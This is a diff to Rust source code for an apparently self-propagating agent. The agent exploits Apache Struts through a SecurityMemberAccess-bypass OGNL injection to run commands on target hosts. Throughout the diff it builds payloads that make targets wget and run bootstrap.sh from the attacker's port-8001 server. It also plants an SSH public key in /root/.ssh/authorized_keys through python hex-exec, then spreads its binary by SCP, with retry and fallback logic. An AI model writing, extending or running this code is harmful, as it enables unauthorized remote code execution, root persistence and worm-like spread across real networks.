@@ -167,11 +167,6 @@ pub async fn run(
         match generate_ephemeral_keypair().await {
             Ok(k) => {
                 tracing::info!(%target, pubkey = %k.pubkey, "ephemeral SSH keypair generated");
-                // Write bootstrap.sh so the binary server can serve it at /bootstrap.sh.
-                // The OGNL payload only needs to wget this URL — no pubkey or complex shell in the URL.
-                if let Err(e) = write_bootstrap_script(&k.pubkey).await {
-                    tracing::warn!(%target, err = %e, "bootstrap script write failed — wget pubkey path unavailable");
-                }
                 Some(k)
             }
             Err(e) => {
@@ -405,23 +400,34 @@ pub async fn run(
             "policy accepted — executing bootstrap"
         );
 
-        // ── Binary server (Exploit class only) ───────────────────────────────
-        // Start ephemeral HTTP server so the OGNL payload can wget the binary.
+        // ── Execute bootstrap ─────────────────────────────────────────────────
+        let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
+        let pubkey = ephemeral_key.as_ref().map(|k| k.pubkey.as_str());
+
+        // ── Binary server (HTTP fallback, Exploit class only) ─────────────────
+        // Writes bootstrap.sh with the current pubkey and starts :8001 so the
+        // http_bootstrap_fallback can serve it if SCP delivery fails.
         // Aborted after the bootstrap attempt regardless of outcome.
-        let binary_server = if method_class == PropagationMethodClass::Exploit {
+        let binary_server = if HTTP_FALLBACK_ENABLED
+            && method_class == PropagationMethodClass::Exploit
+        {
+            if let Some(pk) = pubkey {
+                if let Err(e) = write_bootstrap_script(pk).await {
+                    tracing::warn!(%target, err = %e, "bootstrap script write failed — HTTP fallback unavailable");
+                }
+            }
             if let Some(ip) = local_ip {
                 start_binary_server(ip).await
             } else {
-                tracing::warn!(%target, "Exploit method selected but local_ip is unknown — binary server skipped");
+                tracing::warn!(%target, "Exploit method selected but local_ip unknown — HTTP server skipped");
                 None
             }
         } else {
             None
         };
 
-        // ── Execute bootstrap ─────────────────────────────────────────────────
-        let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
-        let exec_result = execute_bootstrap(&strategy, target, key_path, local_ip, lineage).await;
+        let exec_result =
+            execute_bootstrap(&strategy, target, key_path, local_ip, lineage, pubkey).await;
 
         // Shut down binary server after bootstrap attempt.
         if let Some(h) = binary_server {
@@ -595,6 +601,16 @@ fn infer_os_hint_from_results(results: &[physarum_scanner::SensingResult]) -> Op
 
 /// Maximum concurrent banner grabs per target host.
 const MAX_BANNER_CONCURRENCY: usize = 8;
+
+/// When true, a failed SCP delivery falls back to the HTTP server + wget/sh approach.
+/// Set false during testing to validate SCP-only (encrypted channel) delivery.
+/// In production this should always be true so HTTP acts as a reliable backup.
+const HTTP_FALLBACK_ENABLED: bool = true;
+
+/// Number of SCP upload attempts before the HTTP fallback is triggered.
+/// SCP is tried this many times first; only if all attempts fail does the agent
+/// fall back to the wget/sh HTTP delivery path (when HTTP_FALLBACK_ENABLED is true).
+const SCP_RETRIES_BEFORE_FALLBACK: u32 = 2;
 
 /// Lightweight TCP banner grab — reads the first ≤ 256 bytes a server sends.
 ///
@@ -1384,6 +1400,7 @@ async fn execute_bootstrap(
     key_path: Option<&Path>,
     source_ip: Option<Ipv4Addr>,
     lineage: &crate::lineage::Lineage,
+    pubkey: Option<&str>,
 ) -> ExecutionResultSummary {
     let plan = match &strategy.bootstrap_plan {
         Some(p) => p,
@@ -1399,14 +1416,71 @@ async fn execute_bootstrap(
     // `--mode propagated` can inject `--lineage-b64` into the remote command.
     let lineage_b64 = lineage.to_b64().unwrap_or_default();
 
-    for (i, step) in plan.steps.iter().enumerate() {
+    let mut http_fallback_done = false;
+    let mut scp_fail_count: u32 = 0;
+
+    for i in 0..plan.steps.len() {
+        let step = &plan.steps[i];
         let action = inject_lineage_b64_if_needed(&step.action, &lineage_b64);
-        match execute_step(&action, target, step.timeout_ms, key_path, source_ip).await {
+        let mut result = execute_step(
+            &action,
+            target,
+            step.timeout_ms,
+            key_path,
+            source_ip,
+            pubkey,
+        )
+        .await;
+
+        // SCP retry loop: retry up to SCP_RETRIES_BEFORE_FALLBACK times before the
+        // HTTP fallback is considered. Total SCP attempts = 1 initial + N retries.
+        if matches!(result, StepResult::Failed(_))
+            && matches!(step.action, BootstrapAction::ScpUpload { .. })
+        {
+            scp_fail_count += 1;
+            let mut retry = 0u32;
+            while retry < SCP_RETRIES_BEFORE_FALLBACK && matches!(result, StepResult::Failed(_)) {
+                retry += 1;
+                tracing::info!(%target, step = i, "SCP failed — retrying ({retry}/{SCP_RETRIES_BEFORE_FALLBACK})");
+                result = execute_step(
+                    &action,
+                    target,
+                    step.timeout_ms,
+                    key_path,
+                    source_ip,
+                    pubkey,
+                )
+                .await;
+            }
+        }
+
+        // HTTP fallback: only after all SCP retries are exhausted.
+        if matches!(result, StepResult::Failed(_))
+            && matches!(step.action, BootstrapAction::ScpUpload { .. })
+            && HTTP_FALLBACK_ENABLED
+            && !http_fallback_done
+        {
+            tracing::info!(%target, step = i, scp_fail_count, "SCP exhausted retries — attempting HTTP fallback bootstrap");
+            if http_bootstrap_fallback(plan, target, source_ip, step.timeout_ms).await {
+                http_fallback_done = true;
+                // Pubkey now installed via bootstrap.sh — final SCP attempt.
+                result = execute_step(
+                    &action,
+                    target,
+                    step.timeout_ms,
+                    key_path,
+                    source_ip,
+                    pubkey,
+                )
+                .await;
+            }
+        }
+
+        match result {
             StepResult::Ok | StepResult::Simulated => {
                 tracing::debug!(%target, step = i, "step ok");
-                // After an HttpPost RCE step, allow time for the spawned subprocess
-                // (wget + sh bootstrap.sh) to complete before the next SCP/SSH step.
-                // ProcessBuilder.start() is non-blocking — the shell script runs async.
+                // After an HttpPost RCE step, allow time for the OGNL payload
+                // (WRITE_PUBKEY FileOutputStream) to complete before the next SCP/SSH step.
                 if matches!(step.action, BootstrapAction::HttpPost { .. }) {
                     tokio::time::sleep(std::time::Duration::from_millis(2000)).await;
                 }
@@ -1421,6 +1495,100 @@ async fn execute_bootstrap(
     }
 
     ExecutionResultSummary::Success
+}
+
+/// HTTP fallback bootstrap: sends wget + sh via OGNL to install the ephemeral pubkey
+/// using the :8001 binary server. Returns true if both OGNL requests succeeded.
+///
+/// Called when SCP delivery fails and HTTP_FALLBACK_ENABLED is true. The bootstrap.sh
+/// script (written by write_bootstrap_script) installs the pubkey in authorized_keys,
+/// after which the caller retries SCP.
+async fn http_bootstrap_fallback(
+    plan: &physarum_llm::BootstrapPlan,
+    target: Ipv4Addr,
+    source_ip: Option<Ipv4Addr>,
+    timeout_ms: u64,
+) -> bool {
+    let Some(source_ip) = source_ip else {
+        tracing::warn!(%target, "HTTP fallback skipped — no source_ip");
+        return false;
+    };
+
+    // Extract OgnlExec port + path_prefix from the plan.
+    let Some((port, prefix)) = plan.steps.iter().find_map(|s| {
+        if let BootstrapAction::OgnlExec {
+            port, path_prefix, ..
+        } = &s.action
+        {
+            Some((
+                port.unwrap_or(8080),
+                path_prefix.as_deref().unwrap_or("/").to_string(),
+            ))
+        } else {
+            None
+        }
+    }) else {
+        tracing::warn!(%target, "HTTP fallback skipped — no OgnlExec step in plan");
+        return false;
+    };
+
+    let ip_str = source_ip.to_string();
+    let client = reqwest::Client::new();
+    let dur = tokio::time::Duration::from_millis(timeout_ms);
+
+    // Step 1: wget bootstrap.sh from the binary server.
+    let wget_cmd = format!(
+        "wget -q http://{}:8001/bootstrap.sh -O /tmp/bootstrap.sh",
+        ip_str
+    );
+    let wget_url = format!(
+        "http://{}:{}{}?id={}",
+        target,
+        port,
+        prefix,
+        build_struts_bypass_ognl(&wget_cmd)
+    );
+    tracing::info!(%target, "HTTP fallback: wget bootstrap.sh");
+    match tokio::time::timeout(dur, client.post(&wget_url).send()).await {
+        Ok(Ok(_)) => {}
+        Ok(Err(e)) => {
+            tracing::warn!(%target, err = %e, "HTTP fallback: wget request failed");
+            return false;
+        }
+        Err(_) => {
+            tracing::warn!(%target, "HTTP fallback: wget timeout");
+            return false;
+        }
+    }
+
+    // Wait for wget to finish on the target before running the script.
+    tokio::time::sleep(tokio::time::Duration::from_millis(2000)).await;
+
+    // Step 2: sh bootstrap.sh — installs pubkey + mkdir /tmp/physarum.
+    let sh_url = format!(
+        "http://{}:{}{}?id={}",
+        target,
+        port,
+        prefix,
+        build_struts_bypass_ognl("sh /tmp/bootstrap.sh")
+    );
+    tracing::info!(%target, "HTTP fallback: sh bootstrap.sh");
+    match tokio::time::timeout(dur, client.post(&sh_url).send()).await {
+        Ok(Ok(_)) => {}
+        Ok(Err(e)) => {
+            tracing::warn!(%target, err = %e, "HTTP fallback: sh request failed");
+            return false;
+        }
+        Err(_) => {
+            tracing::warn!(%target, "HTTP fallback: sh timeout");
+            return false;
+        }
+    }
+
+    // Wait for the script to complete before SCP retry.
+    tokio::time::sleep(tokio::time::Duration::from_millis(3000)).await;
+    tracing::info!(%target, "HTTP fallback: bootstrap complete — retrying SCP");
+    true
 }
 
 /// If `action` is a `SshCommand` whose command string launches `physarum-maze --mode propagated`,
@@ -1525,32 +1693,6 @@ fn resolve_http_path(path: &str, source_ip: Option<Ipv4Addr>) -> String {
     path.replace("<source_ip>", &ip_str)
 }
 
-/// Expand `__struts_bypass__` to the wget-only OGNL URL (step 1 of 2).
-/// freemarker.Execute concatenates arglist to a single string for Runtime.exec(String),
-/// so the command must be a single space-separated token string with no shell operators.
-fn resolve_struts_wget(path: &str, source_ip: Option<Ipv4Addr>) -> Option<String> {
-    let ip_str = source_ip.map(|ip| ip.to_string())?;
-    if !path.contains("__struts_bypass__") || ip_str.is_empty() {
-        return None;
-    }
-    let cmd = format!(
-        "wget -q http://{}:8001/bootstrap.sh -O /tmp/bootstrap.sh",
-        ip_str
-    );
-    let encoded_ognl = build_struts_bypass_ognl(&cmd);
-    Some(path.replace("__struts_bypass__", &encoded_ognl))
-}
-
-/// Expand `__struts_bypass__` to the sh-only OGNL URL (step 2 of 2).
-fn resolve_struts_sh(path: &str) -> Option<String> {
-    if !path.contains("__struts_bypass__") {
-        return None;
-    }
-    let cmd = "sh /tmp/bootstrap.sh";
-    let encoded_ognl = build_struts_bypass_ognl(cmd);
-    Some(path.replace("__struts_bypass__", &encoded_ognl))
-}
-
 /// Construct the Struts 2.5.x SecurityMemberAccess bypass OGNL expression URL-encoded
 /// for embedding in a `?id=` query parameter.
 ///
@@ -1560,6 +1702,21 @@ fn resolve_struts_sh(path: &str) -> Option<String> {
 /// Do NOT use "bash -c <cmd>" — the shell command gets split off as bash's $0, not the script.
 ///
 /// Called twice for the Struts S2-bypass: once with the wget command, once with sh.
+/// Build a Struts SecurityMemberAccess-bypass OGNL expression that writes
+/// `content_b64` (Base64-encoded bytes) to `path` using java.io.FileOutputStream.
+/// Write `content` (plain text) to `path` via Python2 hex-exec.
+///
+/// Builds `python -c exec('HEXSTRING'.decode('hex'))` as a single arglist element
+/// so freemarker.Execute tokenises it correctly (no spaces in the -c argument).
+/// Avoids the `new` OGNL keyword (which is blocked separately from excludedClasses
+/// on Struts 2.5.25 real targets even after the InstanceManager bypass clears the sets).
+fn build_struts_file_write_ognl(path: &str, content: &str) -> String {
+    let python_code = format!("open('{}','a').write('{}\\n')", path, content);
+    let hex_code: String = python_code.bytes().map(|b| format!("{:02x}", b)).collect();
+    let cmd = format!("python -c exec('{}'.decode('hex'))", hex_code);
+    build_struts_bypass_ognl(&cmd)
+}
+
 fn build_struts_bypass_ognl(cmd: &str) -> String {
     let ognl = format!(
         concat!(
@@ -1618,6 +1775,7 @@ async fn execute_step(
     timeout_ms: u64,
     key_path: Option<&Path>,
     source_ip: Option<Ipv4Addr>,
+    pubkey: Option<&str>,
 ) -> StepResult {
     use tokio::process::Command;
     use tokio::time::{timeout, Duration};
@@ -1644,51 +1802,7 @@ async fn execute_step(
         } => {
             let p = port.unwrap_or(80);
 
-            // __struts_bypass__ expands to TWO sequential requests: wget then sh.
-            // freemarker.Execute.exec() concatenates list elements then calls Runtime.exec(String)
-            // which tokenizes by whitespace — so each request must be a single-element command
-            // (no shell, no "bash -c") to work correctly.
-            if let (Some(wget_path), Some(sh_path)) = (
-                resolve_struts_wget(path, source_ip),
-                resolve_struts_sh(path),
-            ) {
-                let client = reqwest::Client::new();
-
-                // Step A: wget bootstrap.sh
-                let wget_url = format!("http://{}:{}{}", target, p, wget_path);
-                tracing::info!(%wget_url, "HTTP POST [struts-bypass wget]");
-                let mut wget_req = client.post(&wget_url).body(body.clone());
-                for (k, v) in headers {
-                    wget_req = wget_req.header(k.as_str(), v.as_str());
-                }
-                match timeout(Duration::from_millis(timeout_ms), wget_req.send()).await {
-                    Ok(Ok(r)) if r.status().is_success() || *accept_any_response => {
-                        tracing::info!(status = r.status().as_u16(), "HTTP POST wget completed");
-                    }
-                    Ok(Ok(r)) => return StepResult::Failed(format!("HTTP {}", r.status())),
-                    Ok(Err(e)) => return StepResult::Failed(e.to_string()),
-                    Err(_) => return StepResult::Failed("timeout".into()),
-                }
-
-                // Step B: sh /tmp/bootstrap.sh (Execute.exec() blocks until sh exits)
-                let sh_url = format!("http://{}:{}{}", target, p, sh_path);
-                tracing::info!(%sh_url, "HTTP POST [struts-bypass sh]");
-                let mut sh_req = client.post(&sh_url).body(body.clone());
-                for (k, v) in headers {
-                    sh_req = sh_req.header(k.as_str(), v.as_str());
-                }
-                return match timeout(Duration::from_millis(timeout_ms), sh_req.send()).await {
-                    Ok(Ok(r)) if r.status().is_success() || *accept_any_response => {
-                        tracing::info!(status = r.status().as_u16(), "HTTP POST sh completed");
-                        StepResult::Ok
-                    }
-                    Ok(Ok(r)) => StepResult::Failed(format!("HTTP {}", r.status())),
-                    Ok(Err(e)) => StepResult::Failed(e.to_string()),
-                    Err(_) => StepResult::Failed("timeout".into()),
-                };
-            }
-
-            // Normal (non-Struts) HTTP POST path.
+            // Normal HTTP POST path (Struts __struts_bypass__ removed — use OgnlExec instead).
             let resolved_path = resolve_http_path(path, source_ip);
             let url = format!("http://{}:{}{}", target, p, resolved_path);
             tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
@@ -1876,6 +1990,45 @@ async fn execute_step(
 
             for (i, raw_cmd) in commands.iter().enumerate() {
                 let cmd = raw_cmd.replace("<source_ip>", &ip_str);
+
+                // WRITE_PUBKEY: write the ephemeral pubkey directly to authorized_keys
+                // via java.io.FileWriter OGNL — no HTTP server, no wget, no shell operators.
+                // FileWriter is in java.io.* which is not blocked by excludedPackageNameExpressions.
+                if cmd == "WRITE_PUBKEY" {
+                    let pk = match pubkey {
+                        Some(p) => p,
+                        None => {
+                            return StepResult::Failed(
+                                "WRITE_PUBKEY: no ephemeral pubkey available".into(),
+                            )
+                        }
+                    };
+                    let ognl_url = format!(
+                        "http://{}:{}{}?id={}",
+                        target,
+                        p,
+                        prefix,
+                        build_struts_file_write_ognl("/root/.ssh/authorized_keys", pk)
+                    );
+                    tracing::info!(%target, cmd_index = i, "WRITE_PUBKEY — python hex-exec OGNL");
+                    let req = client.post(&ognl_url);
+                    match tokio::time::timeout(
+                        tokio::time::Duration::from_millis(timeout_ms),
+                        req.send(),
+                    )
+                    .await
+                    {
+                        Ok(Ok(r)) => {
+                            tracing::info!(%target, cmd_index = i, status = r.status().as_u16(), "WRITE_PUBKEY accepted");
+                        }
+                        Ok(Err(e)) => {
+                            return StepResult::Failed(format!("WRITE_PUBKEY HTTP error: {e}"))
+                        }
+                        Err(_) => return StepResult::Failed("WRITE_PUBKEY timeout".into()),
+                    }
+                    continue;
+                }
+
                 let ognl_url = format!(
                     "http://{}:{}{}?id={}",
                     target,
@@ -2175,25 +2328,6 @@ pub(crate) async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey>
         privkey_path,
         pubkey: pubkey.trim().to_string(),
     })
-}
-
-/// Write `/tmp/physarum/bootstrap.sh` — a shell script that plants the ephemeral pubkey
-/// into `/root/.ssh/authorized_keys` and creates `/tmp/physarum` on the target.
-///
-/// The OGNL payload only needs to `wget` this script and run `sh /tmp/bootstrap.sh`,
-/// keeping the OGNL path short and free of pubkey content or `&&` chains.
-async fn write_bootstrap_script(pubkey: &str) -> anyhow::Result<PathBuf> {
-    use std::os::unix::fs::PermissionsExt;
-    let path = PathBuf::from("/tmp/physarum/bootstrap.sh");
-    // printf '%s\n' is safer than echo: handles keys with dashes/spaces without shell expansion.
-    let content = format!(
-        "#!/bin/sh\nmkdir -p /root/.ssh\nchmod 700 /root/.ssh\nprintf '%s\\n' '{}' >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nmkdir -p /tmp/physarum\n",
-        pubkey
-    );
-    tokio::fs::write(&path, &content).await?;
-    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;
-    tracing::debug!(path = %path.display(), "bootstrap.sh written");
-    Ok(path)
 }
 
 // ── Propagation candidate ranking ────────────────────────────────────────────
@@ -2515,16 +2649,63 @@ fn build_template_catalog_for_llm(
     catalog
 }
 
+/// Collect deduplicated CVE IDs from all pattern-finding candidates.
+/// Computed once before the attempt loop; stable across retries.
+///
+/// Two sources:
+/// 1. `vulnerability_candidates` from VulnIntel advisory-cache lookup (generic templates
+///    with version extractors → LocalAdvisoryCache → CVE).
+/// 2. `check_id` when the template itself IS a CVE-specific template (e.g. CVE-2021-31805)
+///    — the template firing is direct evidence of that CVE; no advisory lookup needed.
+fn extract_cve_ids(summaries: &[PatternFindingSummary]) -> Vec<String> {
+    let mut ids: Vec<String> = summaries
+        .iter()
+        .flat_map(|f| {
+            let from_candidates = f.vulnerability_candidates.iter().map(|c| c.cve_id.clone());
+            let from_template_id = if f.check_id.starts_with("CVE-") {
+                Some(f.check_id.clone())
+            } else {
+                None
+            };
+            from_candidates.chain(from_template_id)
+        })
+        .collect();
+    ids.sort();
+    ids.dedup();
+    ids
+}
+
+// ── HTTP fallback bootstrap helpers ──────────────────────────────────────────
+
+/// Write bootstrap.sh to `/tmp/physarum/bootstrap.sh`.
+///
+/// The script installs `pubkey` into `/root/.ssh/authorized_keys` and creates
+/// `/tmp/physarum/`. Served by the binary HTTP server at `/bootstrap.sh` so the
+/// OGNL wget fallback path can fetch and execute it.
+async fn write_bootstrap_script(pubkey: &str) -> anyhow::Result<PathBuf> {
+    use std::os::unix::fs::PermissionsExt;
+    let path = PathBuf::from("/tmp/physarum/bootstrap.sh");
+    tokio::fs::create_dir_all("/tmp/physarum").await?;
+    let content = format!(
+        "#!/bin/sh\nmkdir -p /root/.ssh\nchmod 700 /root/.ssh\nprintf '%s\\n' '{}' >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nmkdir -p /tmp/physarum\n",
+        pubkey
+    );
+    tokio::fs::write(&path, &content).await?;
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;
+    tracing::debug!(path = %path.display(), "bootstrap.sh written");
+    Ok(path)
+}
+
 // ── Binary HTTP server for exploit bootstrap ─────────────────────────────────
 
-/// Start a lightweight HTTP server on `local_ip:8001` serving the physarum-maze
-/// binary at `/physarum-maze`. Used by Phase 2 exploit bootstrap: the OGNL payload
-/// on the target runs `wget http://<local_ip>:8001/physarum-maze` to fetch and
-/// execute the binary.
+/// Start a lightweight HTTP server on `local_ip:8001` serving:
+///   - `/bootstrap.sh` — the pubkey-injecting shell script
+///   - `/physarum-maze` (or any other path) — the agent binary
 ///
-/// Returns the `JoinHandle` so the caller can shut it down after propagation.
-/// The server is already non-blocking: it listens in the background and the
-/// returned handle can be aborted when the exploit step completes.
+/// Used as the HTTP fallback when SCP delivery fails: the OGNL payload runs
+/// `wget http://<local_ip>:8001/bootstrap.sh` to install the ephemeral pubkey,
+/// after which SCP is retried. Returns the `JoinHandle` so the caller can abort
+/// the server after the bootstrap attempt completes.
 async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHandle<()>> {
     use tokio::net::TcpListener;
 
@@ -2543,7 +2724,7 @@ async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHand
         }
     };
 
-    tracing::info!(%local_ip, addr = %addr, "exploit HTTP server started — serving physarum-maze binary");
+    tracing::info!(%local_ip, addr = %addr, "exploit HTTP server started — serving bootstrap.sh + binary");
 
     let handle = tokio::spawn(async move {
         use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -2557,7 +2738,6 @@ async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHand
                 let mut buf = [0u8; 512];
                 let n = socket.read(&mut buf).await.unwrap_or(0);
                 let request = std::str::from_utf8(&buf[..n]).unwrap_or("");
-                // Parse the request path from the first line: "GET /path HTTP/1.x"
                 let path = request
                     .split_whitespace()
                     .nth(1)
@@ -2576,7 +2756,7 @@ async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHand
                             tracing::debug!(%peer, bytes = data.len(), "bootstrap.sh served");
                         }
                         Err(e) => {
-                            tracing::warn!(%peer, err = %e, "bootstrap.sh not found — was write_bootstrap_script called?");
+                            tracing::warn!(%peer, err = %e, "bootstrap.sh not found");
                             let _ = socket.write_all(b"HTTP/1.0 404 Not Found\r\n\r\n").await;
                         }
                     }
@@ -2604,32 +2784,6 @@ async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHand
     });
 
     Some(handle)
-}
-
-/// Collect deduplicated CVE IDs from all pattern-finding candidates.
-/// Computed once before the attempt loop; stable across retries.
-///
-/// Two sources:
-/// 1. `vulnerability_candidates` from VulnIntel advisory-cache lookup (generic templates
-///    with version extractors → LocalAdvisoryCache → CVE).
-/// 2. `check_id` when the template itself IS a CVE-specific template (e.g. CVE-2021-31805)
-///    — the template firing is direct evidence of that CVE; no advisory lookup needed.
-fn extract_cve_ids(summaries: &[PatternFindingSummary]) -> Vec<String> {
-    let mut ids: Vec<String> = summaries
-        .iter()
-        .flat_map(|f| {
-            let from_candidates = f.vulnerability_candidates.iter().map(|c| c.cve_id.clone());
-            let from_template_id = if f.check_id.starts_with("CVE-") {
-                Some(f.check_id.clone())
-            } else {
-                None
-            };
-            from_candidates.chain(from_template_id)
-        })
-        .collect();
-    ids.sort();
-    ids.dedup();
-    ids
 }
 
 #[cfg(test)]
